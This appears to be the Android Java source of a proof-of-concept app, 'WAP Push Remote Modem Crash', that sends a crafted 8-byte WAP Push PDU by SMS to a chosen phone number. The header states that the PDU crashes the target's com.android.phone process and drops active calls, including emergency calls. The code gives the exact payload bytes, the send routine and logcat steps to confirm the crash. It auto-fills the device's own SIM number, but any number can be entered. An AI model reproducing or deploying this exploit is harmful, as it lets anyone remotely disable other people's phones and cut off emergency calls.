package com.markb.wappushcrash;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * WAP Push Remote Modem Crash
 *
 * Sends a crafted 8-byte WAP Push PDU to a target phone number on port 2948.
 * Triggers NegativeArraySizeException in WapPushOverSms.decodeWapPdu line 244
 * → uncaught in InboundSmsHandler.processMessagePart → kills com.android.phone
 * → CS_DEATH on any active call (including emergency).
 *
 * Auto-fills destination from active subscriptions when READ_PHONE_NUMBERS is
 * granted; user can override.
 */
public class MainActivity extends Activity {

    private static final byte[] CRASH_PDU = {
        0x01, 0x06, (byte) 0x88, (byte) 0x80, (byte) 0x80, (byte) 0x80, 0x00, (byte) 0xBE
    };

    private EditText phoneInput;
    private Spinner senderSpinner;
    private TextView status;
    private List<SubscriptionInfo> subs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        phoneInput = findViewById(R.id.phoneInput);
        senderSpinner = findViewById(R.id.senderSpinner);
        status = findViewById(R.id.status);
        Button sendBtn = findViewById(R.id.sendBtn);
        sendBtn.setOnClickListener(v -> sendCrashSms());

        requestPermissions(new String[] {
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_PHONE_STATE
        }, 1);

        populateSubsAndAutofill();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        populateSubsAndAutofill();
    }

    private void populateSubsAndAutofill() {
        try {
            SubscriptionManager sm = (SubscriptionManager)
                getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            if (sm == null) return;

            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                status.setText("Grant READ_PHONE_STATE for SIM enumeration.");
                return;
            }

            subs = sm.getActiveSubscriptionInfoList();
            if (subs == null || subs.isEmpty()) {
                status.setText("No active SIMs found.");
                return;
            }

            String[] items = new String[subs.size()];
            for (int i = 0; i < subs.size(); i++) {
                SubscriptionInfo s = subs.get(i);
                items[i] = "subId " + s.getSubscriptionId()
                    + " — " + s.getDisplayName()
                    + " (slot " + s.getSimSlotIndex() + ")";
            }
            ArrayAdapter<String> adapter = new ArrayAdapter<>(this,
                android.R.layout.simple_spinner_item, items);
            adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
            senderSpinner.setAdapter(adapter);

            senderSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
                @Override
                public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                    autofillDestForSender(position);
                }
                @Override
                public void onNothingSelected(AdapterView<?> parent) {}
            });

            // Initial autofill for default-selected sender (position 0).
            autofillDestForSender(senderSpinner.getSelectedItemPosition());
        } catch (SecurityException e) {
            status.setText("SecurityException reading subscriptions: " + e.getMessage());
        } catch (Exception e) {
            status.setText("Auto-fill error: " + e.getMessage());
        }
    }

    /**
     * Set the destination input to the MSISDN of a SIM other than the selected sender.
     * Always overrides the input when the sender selection changes.
     */
    /**
     * Resolve the MSISDN for a subscription, trying every source available.
     * Empty for many eSIMs unless IMS-registered (numberFromIms). Order:
     *   1. SubscriptionManager.getPhoneNumber(subId)        — consolidated (API 33+)
     *   2. getPhoneNumber(subId, PHONE_NUMBER_SOURCE_IMS)   — eSIM-friendly
     *   3. getPhoneNumber(subId, PHONE_NUMBER_SOURCE_CARRIER)
     *   4. getPhoneNumber(subId, PHONE_NUMBER_SOURCE_UICC)
     *   5. SubscriptionInfo.getNumber()                     — legacy fallback
     */
    private String resolveNumber(SubscriptionInfo s) {
        if (s == null) return null;
        SubscriptionManager sm = (SubscriptionManager)
            getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        int subId = s.getSubscriptionId();
        try {
            String n = sm.getPhoneNumber(subId);
            if (n != null && !n.isEmpty()) return n;
        } catch (Exception ignored) {}
        int[] sources = {
            SubscriptionManager.PHONE_NUMBER_SOURCE_IMS,
            SubscriptionManager.PHONE_NUMBER_SOURCE_CARRIER,
            SubscriptionManager.PHONE_NUMBER_SOURCE_UICC
        };
        for (int src : sources) {
            try {
                String n = sm.getPhoneNumber(subId, src);
                if (n != null && !n.isEmpty()) return n;
            } catch (Exception ignored) {}
        }
        String n = s.getNumber();
        if (n != null && !n.isEmpty()) return n;
        return null;
    }

    private void autofillDestForSender(int senderPos) {
        if (subs == null || subs.isEmpty()) return;
        if (senderPos < 0 || senderPos >= subs.size()) senderPos = 0;
        String autoNum = null;
        int chosenIdx = -1;
        for (int i = 0; i < subs.size(); i++) {
            if (i == senderPos) continue;
            String n = resolveNumber(subs.get(i));
            if (n != null && !n.isEmpty()) {
                autoNum = n;
                chosenIdx = i;
                break;
            }
        }
        if (autoNum == null && !subs.isEmpty()) {
            String n = resolveNumber(subs.get(senderPos));
            if (n != null && !n.isEmpty()) {
                autoNum = n;
                chosenIdx = senderPos;
            }
        }
        if (autoNum != null) {
            phoneInput.setText(autoNum);
            status.setText("Auto-filled destination from SIM idx " + chosenIdx
                + " (subId " + subs.get(chosenIdx).getSubscriptionId() + "): " + autoNum);
        } else {
            status.setText("No MSISDN available on any SIM — enter manually.");
        }
    }

    private void sendCrashSms() {
        String dest = phoneInput.getText().toString().trim();
        if (dest.isEmpty()) {
            status.setText("Enter target phone number first.");
            return;
        }
        if (checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            status.setText("SEND_SMS not granted.");
            return;
        }
        if (subs == null || subs.isEmpty()) {
            status.setText("No SIM info available — re-grant READ_PHONE_STATE.");
            return;
        }
        try {
            int pos = senderSpinner.getSelectedItemPosition();
            if (pos < 0 || pos >= subs.size()) pos = 0;
            int subId = subs.get(pos).getSubscriptionId();

            SmsManager mgr = getSystemService(SmsManager.class).createForSubscriptionId(subId);
            mgr.sendDataMessage(dest, null, (short) 2948, CRASH_PDU, null, null);

            String ts = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
            status.setText(
                "[" + ts + "] SENT\n" +
                "  to: " + dest + "\n" +
                "  from: subId " + subId + " (slot " + subs.get(pos).getSimSlotIndex() + ")\n" +
                "  PDU: 01 06 88 80 80 80 00 BE (port 2948)\n\n" +
                "Watch logcat:\n" +
                "  adb logcat | grep -E 'NegativeArraySize|WapPushOverSms|com.android.phone'\n\n" +
                "Expected: FATAL EXCEPTION in com.android.phone within ~1-2s,\n" +
                "PID change for com.android.phone, signal-bar drop briefly."
            );
        } catch (SecurityException e) {
            status.setText("SecurityException on send: " + e.getMessage());
        } catch (Exception e) {
            status.setText("Send error: " + e.getMessage());
        }
    }
}
